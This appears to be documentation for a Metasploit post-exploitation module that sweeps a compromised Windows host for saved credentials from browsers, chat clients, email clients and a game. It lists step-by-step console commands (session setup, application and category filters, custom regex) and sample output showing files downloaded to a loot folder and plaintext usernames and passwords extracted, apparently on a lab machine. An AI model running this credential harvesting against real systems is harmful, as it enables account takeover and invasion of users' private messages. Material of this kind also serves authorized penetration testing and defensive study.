## Module Description

This post-exploitation module gathers artifacts from end users systems.

Artifacts include 13 Browers, 12 IM (chat) applications, 6 Email clients and 1 Game
These artiacts and then scraped for credentials (usernames/passwords) and custom regular expressions

6 Email clients:
Incredimail, Outlook, Opera Mail, PostBox Mail, Mozilla Thunderbird Mail, Windows Live Mail

12 IM (chat):
AIM (Aol Instant Messaging), Digsby, GaduGadu, ICQ, Miranda, Nimbuzz, Pidgen, QQ (Chinese), Skype, Tango, Tlen.pl (Polish), Trillian, Viber, xChat

1 Game:
Xfire

13 Browser:
Avant, Comodo, CoolNovo, Chrome, FireFox, Flock, IE, K-Meleon, Maxthon, Opera, SRware, Safari, SeaMonkey

## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/packrat_credentials
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications



## Options 'APPLICATIONS'

Users can enter APPLICATIONS to extract from example output shown below for email service incredimail

msf post(windows/gather/credentials/packrat_credentials) > set SESSION 1
SESSION => 1
msf post(windows/gather/credentials/packrat_credentials) > set APPLICATION incredimail
APPLICATION => incredimail
msf post(windows/gather/credentials/packrat_credentials) > exploit

[*] Filtering based on these selections:
[*] APPCATEGORY: All, APPLICATION: Incredimail, ARTIFACTS: All

[*] Incredimail's Msg.iml file found
[*] Downloading C:\Users\student\AppData\Local\IM\Identities\{751CBA0D-062E-4661-A2FC-DC4AB5C0CE14}\Message Store\Messages\1\{066C0401-AB3B-4D9D-99E2-F3A0ED06AD84}\msg.iml
[*] Incredimail Msg.iml downloaded (IncrediMail sent and received emails)
[+] File saved to:  /root/.msf4/loot/20190419180935_default_192.168.201.80_incredimailmsg.i_256366.iml

[*] File with credentials saved:  /root/.msf4/loot/20190419180935_default_192.168.201.80_msg.imlCREDENTIA_270085.iml
[*] Downloading C:\Users\student\AppData\Local\IM\Identities\{751CBA0D-062E-4661-A2FC-DC4AB5C0CE14}\Message Store\Messages\1\{FA4CE6FD-C88E-4BD8-AF51-425A27317D79}\msg.iml
[*] Incredimail Msg.iml downloaded (IncrediMail sent and received emails)
[+] File saved to:  /root/.msf4/loot/20190419180935_default_192.168.201.80_incredimailmsg.i_909151.iml

[+] password:incredimail_password89!


## Options 'APPCATAGORY'

the user can specify what type of artifacts to extrac e.g. Emails

msf post(windows/gather/credentials/updated_packrat) > set APPCATEGORY chats 
APPCATEGORY => chats
msf post(windows/gather/credentials/updated_packrat) > run

[*] Filtering based on these selections:
[*] APPCATEGORY: Chats, APPLICATION: All, ARTIFACTS: All
[-] Unexpected Windows error 1332
[*] Pidgen's Accounts.xml file found
[*] Downloading C:\Users\student\AppData\Roaming\.purple\accounts.xml
[*] Pidgen Accounts.xml downloaded (Pidgen's saved Username & Passwords)
[+] File saved to:  /root/.msf4/loot/20190419182347_default_192.168.201.80_pidgenaccounts.x_471388.xml

[+] <name>Pidgen_User44</name>
[+] <password>tiaspbiqe2r</password>
[+] <alias>project_pidgen</alias>
[*] File with credentials saved:  /root/.msf4/loot/20190419182347_default_192.168.201.80_accounts.xmlCRED_543101.xml
[*] Pidgen's *.html file found
[*] PackRat credential sweep Completed. Check for artifacts and credentials in Loot
[*] Post module execution completed


## Options 'REGEX'
users can set their own regular expressions exmple below shows password:.* being seearched for 


msf post(windows/gather/credentials/updated_packrat) > set REGEX password:.*
REGEX => (?-mix:password:.*)
msf post(windows/gather/credentials/updated_packrat) > run

[*] Filtering based on these selections:
[*] APPCATEGORY: All, APPLICATION: All, ARTIFACTS: All
[*] Windowlivemail's *.oeaccount file found
[*] Incredimail's Msg.iml file found
[*] Downloading C:\Users\student\AppData\Local\IM\Identities\{751CBA0D-062E-4661-A2FC-DC4AB5C0CE14}\Message Store\Messages\1\{066C0401-AB3B-4D9D-99E2-F3A0ED06AD84}\msg.iml
[*] Incredimail Msg.iml downloaded (IncrediMail sent and received emails)
[+] File saved to:  /root/.msf4/loot/20190419182744_default_192.168.201.80_incredimailmsg.i_855680.iml

[+] To:NewIncrediMailMember
[+] From:"IncrediMail"<incredimail@incredimail.com>
[*] File with credentials saved:  /root/.msf4/loot/20190419182745_default_192.168.201.80_msg.imlCREDENTIA_705350.iml
[*] Downloading C:\Users\student\AppData\Local\IM\Identities\{751CBA0D-062E-4661-A2FC-DC4AB5C0CE14}\Message Store\Messages\1\{FA4CE6FD-C88E-4BD8-AF51-425A27317D79}\msg.iml
[*] Incredimail Msg.iml downloaded (IncrediMail sent and received emails)
[+] File saved to:  /root/.msf4/loot/20190419182745_default_192.168.201.80_incredimailmsg.i_585117.iml

[+] Password
[+] password:incredimail_password89!


## Options VERBOSE
by default verbose is turned off, when turned on the module will show information on files which arent extracted and provide descriptions of what credentials are being found.

msf post(windows/gather/credentials/updated_packrat) > set verbose 1
verbose => true
msf post(windows/gather/credentials/updated_packrat) > set APPLICATION pidgen
APPLICATION => pidgen
msf post(windows/gather/credentials/updated_packrat) > run

[*] Filtering based on these selections:
[*] APPCATEGORY: All, APPLICATION: Pidgen, ARTIFACTS: All
[-] Unexpected Windows error 1332
[*] Searching for Pidgen's Accounts.xml files in 's user directory...
[-] Pidgen's Accounts.xml not found in 's user directory

[*] Searching for Pidgen's Accounts.xml files in student's user directory...
[*] Pidgen's Accounts.xml file found
[*] Downloading C:\Users\student\AppData\Roaming\.purple\accounts.xml
[*] Pidgen Accounts.xml downloaded (Pidgen's saved Username & Passwords)
[+] File saved to:  /root/.msf4/loot/20190419183047_default_192.168.201.80_pidgenaccounts.x_891221.xml

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <name>Pidgen_User44</name>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <password>tiaspbiqe2r</password>
[*] Searches for Identity
[+] <alias>project_pidgen</alias>


## Options 'Store loot'
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files.
